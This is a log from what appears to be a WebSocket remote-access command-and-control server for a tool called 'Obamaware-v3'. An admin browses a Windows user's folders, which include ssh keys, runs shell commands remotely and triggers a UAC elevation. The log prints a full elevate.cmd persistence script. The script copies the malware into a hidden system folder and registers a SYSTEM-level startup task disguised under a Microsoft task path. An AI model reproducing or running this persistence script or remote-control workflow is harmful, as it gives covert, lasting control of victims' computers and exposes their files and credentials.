+[2026-01-20 19:31:04] Reply from Client: The filename, directory name, or volume label syntax is incorrect.
+C:\Windows\System32
+[2026-01-20 19:31:04] [send_ws] sending 89 bytes: 81 57 54 68 65 20 66 69 6C 65 6E 61 6D 65 2C 20 64 69 72 65 63 74 6F 72 79 20 6E 61 6D 65 2C 20 6F 72 20 76 6F 6C 75 6D 65 20 6C 61 62 65 6C 20 73 79 6E 74 61 78 20 69 73 20 69 6E 63 6F 72 72 ...  ascii='�WThe filename, directory name, or volume label syntax is incorrect.\r\nC:\\Windows\\System32'
+[2026-01-20 19:31:04] iterated admin loop
+[2026-01-20 19:31:04] waiting for admin commands...
+[2026-01-20 19:31:17] Command from Admin: __CD__ ### cd C:/Users/vikto/
+[2026-01-20 19:31:17] Waiting for client Reply...
+[2026-01-20 19:31:17] [send_ws] sending 31 bytes: 81 1D 5F 5F 43 44 5F 5F 20 23 23 23 20 63 64 20 43 3A 2F 55 73 65 72 73 2F 76 69 6B 74 6F 2F  ascii='�\x1d__CD__ ### cd C:/Users/vikto/'
+[2026-01-20 19:31:17] Reply from Client: C:\Users\vikto
+[2026-01-20 19:31:17] [send_ws] sending 16 bytes: 81 0E 43 3A 5C 55 73 65 72 73 5C 76 69 6B 74 6F  ascii='�\x0eC:\\Users\\vikto'
+[2026-01-20 19:31:17] iterated admin loop
+[2026-01-20 19:31:17] waiting for admin commands...
+[2026-01-20 19:31:19] Command from Admin: __EXECUTE__ ### dir
+[2026-01-20 19:31:19] Waiting for client Reply...
+[2026-01-20 19:31:19] [send_ws] sending 21 bytes: 81 13 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 64 69 72  ascii='�\x13__EXECUTE__ ### dir'
+[2026-01-20 19:31:19] Reply from Client: Volume in drive C is OS
+ Volume Serial Number is C67D-D508
+
+ Directory of C:\Users\vikto
+
+01/20/2026  03:52 PM    <DIR>          .
+02/20/2025  04:51 PM    <DIR>          ..
+01/12/2026  05:35 PM             4,514 -discord-to-epicgames.cmd
+12/28/2024  02:58 PM    <DIR>          .android
+01/02/2026  08:54 PM    <DIR>          .cache
+01/15/2026  07:13 PM    <DIR>          .codex
+10/04/2025  04:01 PM    <DIR>          .dotnet
+03/20/2025  08:43 PM               238 .gitconfig
+10/05/2025  08:35 PM    <DIR>          .msf4
+11/04/2025  04:45 PM    <DIR>          .ollama
+09/04/2025  08:55 AM    <DIR>          .openjfx
+10/17/2025  04:08 PM    <DIR>          .platformio
+01/20/2026  07:25 PM    <DIR>          .ssh
+03/21/2025  10:32 PM    <DIR>          .theia
+02/23/2024  07:30 PM    <DIR>          .vscode
+03/21/2025  03:22 PM    <DIR>          .windows-build-tools
+10/17/2025  04:08 PM    <DIR>          arm-gnu-toolchain
+12/10/2025  03:35 PM                 2 bank.py
+09/29/2025  09:00 PM    <DIR>          build
+01/18/2026  04:40 PM    <DIR>          clone
+02/20/2025  06:06 PM    <DIR>          Contacts
+12/03/2025  08:43 PM           274,432 debug_inject.exe
+09/29/2025  09:00 PM    <DIR>          dist
+01/19/2026  06:23 PM    <DIR>          DLLobama
+10/07/2025  08:30 PM    <DIR>          DllProxyBuilder
+11/24/2025  05:12 PM           273,408 dll_loader.exe
+10/03/2025  04:13 PM    <DIR>          Documents
+01/20/2026  03:50 PM    <DIR>          Downloads
+01/07/2026  08:42 AM    <DIR>          Downloads - Copy
+08/26/2025  10:45 AM    <DIR>          esp
+01/20/2026  03:53 PM               100 evil.html
+02/20/2025  06:06 PM    <DIR>          Favorites
+10/07/2025  04:10 PM             1,545 file.vbs
+10/18/2025  04:25 PM           120,116 first20pct.ps1
+09/25/2025  04:17 PM               355 fun.bat
+11/14/2025  06:34 PM    <DIR>          gittools
+09/11/2025  04:44 PM                 0 hashcat.exe
+08/30/2025  03:17 PM    <DIR>          kernels
+01/17/2026  03:00 PM    <DIR>          key
+02/20/2025  06:06 PM    <DIR>          Links
+10/01/2025  01:23 PM    <DIR>          llvm-mingw-20250924-msvcrt-i686
+03/23/2025  02:17 PM    <DIR>          microbit
+01/18/2026  02:38 PM                36 mini_shell_output.txt
+02/20/2025  06:06 PM    <DIR>          Music
+12/15/2025  04:19 PM                25 myscript.cmd
+10/30/2025  08:41 PM           436,986 Obama.html
+01/19/2026  12:04 PM    <DIR>          ObamaRelease
+01/20/2026  05:05 PM    <DIR>          OneDrive
+01/07/2026  08:11 AM    <DIR>          pico
+03/03/2024  01:38 PM    <DIR>          PycharmProjects
+02/20/2025  06:06 PM    <DIR>          Saved Games
+12/16/2025  06:08 PM    <DIR>          Searches
+01/04/2026  10:35 PM    <DIR>          servers
+01/17/2026  12:38 PM    <DIR>          shellCodeLoader
+12/28/2025  02:29 PM    <DIR>          Snake
+10/01/2025  02:51 PM    <DIR>          source
+10/20/2025  01:32 PM             1,675 ssh-key-2025-10-20.key
+12/24/2025  03:40 PM             1,675 ssh-key-2025-12-24.key
+09/29/2025  08:58 PM    <DIR>          venv
+02/20/2025  06:06 PM    <DIR>          Videos
+              15 File(s)      1,115,107 bytes
+              45 Dir(s)  25,346,662,400 bytes free
+[2026-01-20 19:31:19] [send_ws] sending 3238 bytes: 81 7E 0C A2 56 6F 6C 75 6D 65 20 69 6E 20 64 72 69 76 65 20 43 20 69 73 20 4F 53 0D 0A 20 56 6F 6C 75 6D 65 20 53 65 72 69 61 6C 20 4E 75 6D 62 65 72 20 69 73 20 43 36 37 44 2D 44 35 30 38 0D ...  ascii='�~\x0c�Volume in drive C is OS\r\n Volume Serial Number is C67D-D508\r\n\r\n Directory of C:\\Users\\vikto\r\n\r\n01/20/2026  03:52 PM    <DIR>          .\r\n02/20/2025  04:51 PM    <DIR>          ..\r\n01/12/2026  05:35 PM             4,514 -discord-to-epicgames.cmd\r\n12/28/2024  02:58 PM    <DIR>          .android\r\n01/02/2026  08:54 PM    <DIR>          .cache\r\n01/15/2026  07:13 PM    <DIR>          .codex\r\n10/04/2025  04:01 PM    <DIR>          .dotnet\r\n03/20/2025  08:43 PM               238 .gitconfig\r\n10/05/2025  08:35 PM    <DIR>          .msf4\r\n11/04/2025  04:45 PM    <DIR>          .ollama\r\n09/04/2025  08:55 AM    <DIR>          .openjfx\r\n10/17/2025  04:08 PM    <DIR>          .platformio\r\n01/20/2026  07:25 PM    <DIR>          .ssh\r\n03/21/2025  10:32 PM    <DIR>          .theia\r\n02/23/2024  07:30 PM    <DIR>          .vscode\r\n03/21/2025  03:22 PM    <DIR>          .windows-build-tools\r\n10/17/2025  04:08 PM    <DIR>          arm-gnu-toolchain\r\n12/10/2025  03:35 PM                 2 bank.py\r\n09/29/2025  09:00 PM    <DIR>          build\r\n01/18/2026  04:40 PM    <DIR>          clone\r\n02/20/2025  06:06 PM    <DIR>          Contacts\r\n12/03/2025  08:43 PM           274,432 debug_inject.exe\r\n09/29/2025  09:00 PM    <DIR>          dist\r\n01/19/2026  06:23 PM    <DIR>          DLLobama\r\n10/07/2025  08:30 PM    <DIR>          DllProxyBuilder\r\n11/24/2025  05:12 PM           273,408 dll_loader.exe\r\n10/03/2025  04:13 PM    <DIR>          Documents\r\n01/20/2026  03:50 PM    <DIR>          Downloads\r\n01/07/2026  08:42 AM    <DIR>          Downloads - Copy\r\n08/26/2025  10:45 AM    <DIR>          esp\r\n01/20/2026  03:53 PM               100 evil.html\r\n02/20/2025  06:06 PM    <DIR>          Favorites\r\n10/07/2025  04:10 PM             1,545 file.vbs\r\n10/18/2025  04:25 PM           120,116 first20pct.ps1\r\n09/25/2025  04:17 PM               355 fun.bat\r\n11/14/2025  06:34 PM    <DIR>          gittools\r\n09/11/2025  04:44 PM                 0 hashcat.exe\r\n08/30/2025  03:17 PM    <DIR>          kernels\r\n01/17/2026  03:00 PM    <DIR>          key\r\n02/20/2025  06:06 PM    <DIR>          Links\r\n10/01/2025  01:23 PM    <DIR>          llvm-mingw-20250924-msvcrt-i686\r\n03/23/2025  02:17 PM    <DIR>          microbit\r\n01/18/2026  02:38 PM                36 mini_shell_output.txt\r\n02/20/2025  06:06 PM    <DIR>          Music\r\n12/15/2025  04:19 PM                25 myscript.cmd\r\n10/30/2025  08:41 PM           436,986 Obama.html\r\n01/19/2026  12:04 PM    <DIR>          ObamaRelease\r\n01/20/2026  05:05 PM    <DIR>          OneDrive\r\n01/07/2026  08:11 AM    <DIR>          pico\r\n03/03/2024  01:38 PM    <DIR>          PycharmProjects\r\n02/20/2025  06:06 PM    <DIR>          Saved Games\r\n12/16/2025  06:08 PM    <DIR>          Searches\r\n01/04/2026  10:35 PM    <DIR>          servers\r\n01/17/2026  12:38 PM    <DIR>          shellCodeLoader\r\n12/28/2025  02:29 PM    <DIR>          Snake\r\n10/01/2025  02:51 PM    <DIR>          source\r\n10/20/2025  01:32 PM             1,675 ssh-key-2025-10-20.key\r\n12/24/2025  03:40 PM             1,675 ssh-key-2025-12-24.key\r\n09/29/2025  08:58 PM    <DIR>          venv\r\n02/20/2025  06:06 PM    <DIR>          Videos\r\n              15 File(s)      1,115,107 bytes\r\n              45 Dir(s)  25,346,662,400 bytes free'
+[2026-01-20 19:31:19] iterated admin loop
+[2026-01-20 19:31:19] waiting for admin commands...
+[2026-01-20 19:31:21] Command from Admin: __CD__ ### cd appdata
+[2026-01-20 19:31:21] Waiting for client Reply...
+[2026-01-20 19:31:21] [send_ws] sending 23 bytes: 81 15 5F 5F 43 44 5F 5F 20 23 23 23 20 63 64 20 61 70 70 64 61 74 61  ascii='�\x15__CD__ ### cd appdata'
+[2026-01-20 19:31:22] Reply from Client: C:\Users\vikto\AppData
+[2026-01-20 19:31:22] [send_ws] sending 24 bytes: 81 16 43 3A 5C 55 73 65 72 73 5C 76 69 6B 74 6F 5C 41 70 70 44 61 74 61  ascii='�\x16C:\\Users\\vikto\\AppData'
+[2026-01-20 19:31:22] iterated admin loop
+[2026-01-20 19:31:22] waiting for admin commands...
+[2026-01-20 19:31:26] Command from Admin: __CD__ ### cd local
+[2026-01-20 19:31:26] Waiting for client Reply...
+[2026-01-20 19:31:26] [send_ws] sending 21 bytes: 81 13 5F 5F 43 44 5F 5F 20 23 23 23 20 63 64 20 6C 6F 63 61 6C  ascii='�\x13__CD__ ### cd local'
+[2026-01-20 19:31:26] Reply from Client: C:\Users\vikto\AppData\Local
+[2026-01-20 19:31:26] [send_ws] sending 30 bytes: 81 1C 43 3A 5C 55 73 65 72 73 5C 76 69 6B 74 6F 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C  ascii='�\x1cC:\\Users\\vikto\\AppData\\Local'
+[2026-01-20 19:31:26] iterated admin loop
+[2026-01-20 19:31:26] waiting for admin commands...
+[2026-01-20 19:31:31] Command from Admin: __CD__ ### cd Obamaware-v3
+[2026-01-20 19:31:31] Waiting for client Reply...
+[2026-01-20 19:31:31] [send_ws] sending 28 bytes: 81 1A 5F 5F 43 44 5F 5F 20 23 23 23 20 63 64 20 4F 62 61 6D 61 77 61 72 65 2D 76 33  ascii='�\x1a__CD__ ### cd Obamaware-v3'
+[2026-01-20 19:31:31] Reply from Client: C:\Users\vikto\AppData\Local\Obamaware-v3
+[2026-01-20 19:31:31] [send_ws] sending 43 bytes: 81 29 43 3A 5C 55 73 65 72 73 5C 76 69 6B 74 6F 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C 5C 4F 62 61 6D 61 77 61 72 65 2D 76 33  ascii='�)C:\\Users\\vikto\\AppData\\Local\\Obamaware-v3'
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] waiting for admin commands...
+[2026-01-20 19:31:31] No command from Admin, resetting connection...
+[2026-01-20 19:31:31] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:31:31] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 19:31:31] iterated admin loop
+[2026-01-20 19:31:31] Client disconnected: ('127.0.0.1', 56682)
+[2026-01-20 19:31:32] Client disconnected: ('127.0.0.1', 56690)
+[2026-01-20 19:31:38] Connected: ('127.0.0.1', 54392)
+[2026-01-20 19:31:38] ('127.0.0.1', 54392) is admin
+[2026-01-20 19:31:39] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:31:39] waiting for admin commands...
+[2026-01-20 19:31:40] Command from Admin: __CD__ ### cd
+[2026-01-20 19:31:40] Waiting for client Reply...
+[2026-01-20 19:31:40] No Client connected.
+[2026-01-20 19:31:40] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:31:40] iterated admin loop
+[2026-01-20 19:31:41] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:31:41] waiting for admin commands...
+[2026-01-20 19:31:42] Command from Admin: __CD__ ### cd
+[2026-01-20 19:31:42] Waiting for client Reply...
+[2026-01-20 19:31:42] No Client connected.
+[2026-01-20 19:31:42] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:31:42] iterated admin loop
+[2026-01-20 19:31:43] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:31:43] waiting for admin commands...
+[2026-01-20 19:31:43] Connected: ('127.0.0.1', 32912)
+[2026-01-20 19:31:43] Set Client to: ('127.0.0.1', 32912)
+[2026-01-20 19:31:44] Command from Admin: __CD__ ### cd
+[2026-01-20 19:31:44] Waiting for client Reply...
+[2026-01-20 19:31:44] No Client connected.
+[2026-01-20 19:31:44] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:31:44] iterated admin loop
+[2026-01-20 19:31:44] waiting for admin commands...
+[2026-01-20 19:31:44] Command from Admin: __CD__ ### cd
+[2026-01-20 19:31:44] Waiting for client Reply...
+[2026-01-20 19:31:44] [send_ws] sending 15 bytes: 81 0D 5F 5F 43 44 5F 5F 20 23 23 23 20 63 64  ascii='�\r__CD__ ### cd'
+[2026-01-20 19:31:45] Reply from Client: C:\Users\vikto\AppData\Local\Obamaware-v3
+[2026-01-20 19:31:45] [send_ws] sending 43 bytes: 81 29 43 3A 5C 55 73 65 72 73 5C 76 69 6B 74 6F 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C 5C 4F 62 61 6D 61 77 61 72 65 2D 76 33  ascii='�)C:\\Users\\vikto\\AppData\\Local\\Obamaware-v3'
+[2026-01-20 19:31:45] iterated admin loop
+[2026-01-20 19:31:45] waiting for admin commands...
+[2026-01-20 19:31:47] Command from Admin: __EXECUTE__ ### dir
+[2026-01-20 19:31:47] Waiting for client Reply...
+[2026-01-20 19:31:47] [send_ws] sending 21 bytes: 81 13 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 64 69 72  ascii='�\x13__EXECUTE__ ### dir'
+[2026-01-20 19:31:47] Reply from Client: Volume in drive C is OS
+ Volume Serial Number is C67D-D508
+
+ Directory of C:\Users\vikto\AppData\Local\Obamaware-v3
+
+01/20/2026  03:23 PM    <DIR>          ..
+01/20/2026  03:20 PM           166,912 dependencymanager.dll
+01/20/2026  03:20 PM           111,104 directmanipulation.dll
+01/20/2026  06:46 PM               421 elevate.cmd
+01/20/2026  07:25 PM           134,144 start_elevateable.exe
+01/20/2026  03:19 PM    <DIR>          tor
+01/20/2026  06:46 PM           103,424 Windows Wireless LAN Adapter.exe
+01/20/2026  06:46 PM           274,944 winexpress.exe
+01/20/2026  06:46 PM               130 win_start.cmd
+               7 File(s)        791,079 bytes
+               2 Dir(s)  25,346,654,208 bytes free
+[2026-01-20 19:31:47] [send_ws] sending 731 bytes: 81 7E 02 D7 56 6F 6C 75 6D 65 20 69 6E 20 64 72 69 76 65 20 43 20 69 73 20 4F 53 0D 0A 20 56 6F 6C 75 6D 65 20 53 65 72 69 61 6C 20 4E 75 6D 62 65 72 20 69 73 20 43 36 37 44 2D 44 35 30 38 0D ...  ascii='�~\x02�Volume in drive C is OS\r\n Volume Serial Number is C67D-D508\r\n\r\n Directory of C:\\Users\\vikto\\AppData\\Local\\Obamaware-v3\r\n\r\n01/20/2026  03:23 PM    <DIR>          ..\r\n01/20/2026  03:20 PM           166,912 dependencymanager.dll\r\n01/20/2026  03:20 PM           111,104 directmanipulation.dll\r\n01/20/2026  06:46 PM               421 elevate.cmd\r\n01/20/2026  07:25 PM           134,144 start_elevateable.exe\r\n01/20/2026  03:19 PM    <DIR>          tor\r\n01/20/2026  06:46 PM           103,424 Windows Wireless LAN Adapter.exe\r\n01/20/2026  06:46 PM           274,944 winexpress.exe\r\n01/20/2026  06:46 PM               130 win_start.cmd\r\n               7 File(s)        791,079 bytes\r\n               2 Dir(s)  25,346,654,208 bytes free'
+[2026-01-20 19:31:47] iterated admin loop
+[2026-01-20 19:31:47] waiting for admin commands...
+[2026-01-20 19:31:56] Command from Admin: __EXECUTE__ ### type elevate.cmd
+[2026-01-20 19:31:56] Waiting for client Reply...
+[2026-01-20 19:31:56] [send_ws] sending 34 bytes: 81 20 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 74 79 70 65 20 65 6C 65 76 61 74 65 2E 63 6D 64  ascii='� __EXECUTE__ ### type elevate.cmd'
+[2026-01-20 19:31:57] Reply from Client: @echo off
+md %windir%\bin 2>nul
+xcopy "%LOCALAPPDATA%\Obamaware-v3" "%windir%\bin" /E /I /Y /Q
+attrib +h +s "C:\Windows\bin"
+schtasks /create /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask" /tr "cmd /c \"%windir%\bin\win_start.cmd\"" /sc onstart /ru SYSTEM /f /rl HIGHEST /it /delay 0000:05 >nul 2>&1
+REM powershell -c "Start-Process explorer -ArgumentList '/root, "PATH_TO_BATCH_OR_EXE"' -Verb RunAs"
+[2026-01-20 19:31:57] [send_ws] sending 424 bytes: 81 7E 01 A4 40 65 63 68 6F 20 6F 66 66 0A 6D 64 20 25 77 69 6E 64 69 72 25 5C 62 69 6E 20 32 3E 6E 75 6C 0A 78 63 6F 70 79 20 22 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25 5C 4F 62 61 6D 61 77 ...  ascii='�~\x01�@echo off\nmd %windir%\\bin 2>nul\nxcopy "%LOCALAPPDATA%\\Obamaware-v3" "%windir%\\bin" /E /I /Y /Q\nattrib +h +s "C:\\Windows\\bin"\nschtasks /create /tn "\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask" /tr "cmd /c \\"%windir%\\bin\\win_start.cmd\\"" /sc onstart /ru SYSTEM /f /rl HIGHEST /it /delay 0000:05 >nul 2>&1\nREM powershell -c "Start-Process explorer -ArgumentList \'/root, "PATH_TO_BATCH_OR_EXE"\' -Verb RunAs"'
+[2026-01-20 19:31:57] iterated admin loop
+[2026-01-20 19:31:57] waiting for admin commands...
+[2026-01-20 19:32:17] iterated admin loop
+[2026-01-20 19:32:17] waiting for admin commands...
+[2026-01-20 19:32:30] Command from Admin: __QUIT__
+[2026-01-20 19:32:30] Waiting for client Reply...
+[2026-01-20 19:32:30] [send_ws] sending 10 bytes: 81 08 5F 5F 51 55 49 54 5F 5F  ascii='�\x08__QUIT__'
+[2026-01-20 19:32:30] No reply from Client.
+[2026-01-20 19:32:30] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:32:30] iterated admin loop
+[2026-01-20 19:32:30] waiting for admin commands...
+[2026-01-20 19:32:33] Command from Admin: __EXECUTE__ ### e
+[2026-01-20 19:32:33] Waiting for client Reply...
+[2026-01-20 19:32:33] [send_ws] sending 19 bytes: 81 11 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 65  ascii='�\x11__EXECUTE__ ### e'
+[2026-01-20 19:32:33] No reply from Client.
+[2026-01-20 19:32:33] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:32:33] iterated admin loop
+[2026-01-20 19:32:33] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] waiting for admin commands...
+[2026-01-20 19:32:34] No command from Admin, resetting connection...
+[2026-01-20 19:32:34] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:32:34] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 19:32:34] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 19:32:34] iterated admin loop
+[2026-01-20 19:32:34] Client disconnected: ('127.0.0.1', 54392)
+[2026-01-20 19:32:35] Client disconnected: ('127.0.0.1', 32912)
+[2026-01-20 19:41:30] Connected: ('127.0.0.1', 38624)
+[2026-01-20 19:41:31] ('127.0.0.1', 38624) is admin
+[2026-01-20 19:41:33] waiting for admin commands...
+[2026-01-20 19:41:36] Connected: ('127.0.0.1', 38634)
+[2026-01-20 19:41:36] Set Client to: ('127.0.0.1', 38634)
+[2026-01-20 19:41:38] Command from Admin: __PROC__
+[2026-01-20 19:41:38] Waiting for client Reply...
+[2026-01-20 19:41:38] No Client connected.
+[2026-01-20 19:41:38] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:41:38] iterated admin loop
+[2026-01-20 19:41:38] waiting for admin commands...
+[2026-01-20 19:41:39] Command from Admin: __PROC__
+[2026-01-20 19:41:39] Waiting for client Reply...
+[2026-01-20 19:41:39] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:41:39] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:41:39] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:41:39] iterated admin loop
+[2026-01-20 19:41:39] waiting for admin commands...
+[2026-01-20 19:41:43] Command from Admin: __UAC__ ### elevate
+[2026-01-20 19:41:43] Waiting for client Reply...
+[2026-01-20 19:41:43] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 19:41:48] Reply from Client: Started elevation via UAC
+[2026-01-20 19:41:48] [send_ws] sending 27 bytes: 81 19 53 74 61 72 74 65 64 20 65 6C 65 76 61 74 69 6F 6E 20 76 69 61 20 55 41 43  ascii='�\x19Started elevation via UAC'
+[2026-01-20 19:41:48] iterated admin loop
+[2026-01-20 19:41:48] waiting for admin commands...
+[2026-01-20 19:42:08] iterated admin loop
+[2026-01-20 19:42:08] waiting for admin commands...
+[2026-01-20 19:42:28] iterated admin loop
+[2026-01-20 19:42:28] waiting for admin commands...
+[2026-01-20 19:42:48] iterated admin loop
+[2026-01-20 19:42:48] waiting for admin commands...
+[2026-01-20 19:43:08] iterated admin loop
+[2026-01-20 19:43:08] waiting for admin commands...
+[2026-01-20 19:43:28] iterated admin loop
+[2026-01-20 19:43:28] waiting for admin commands...
+[2026-01-20 19:43:48] iterated admin loop
+[2026-01-20 19:43:48] waiting for admin commands...
+[2026-01-20 19:44:08] iterated admin loop
+[2026-01-20 19:44:08] waiting for admin commands...
+[2026-01-20 19:44:28] iterated admin loop
+[2026-01-20 19:44:28] waiting for admin commands...
+[2026-01-20 19:44:35] Command from Admin: __DOWNGRADE__
+[2026-01-20 19:44:35] Waiting for client Reply...
+[2026-01-20 19:44:35] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:44:57] No reply from Client.
+[2026-01-20 19:44:57] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:44:57] iterated admin loop
+[2026-01-20 19:44:57] waiting for admin commands...
+[2026-01-20 19:44:57] admin socket dead.
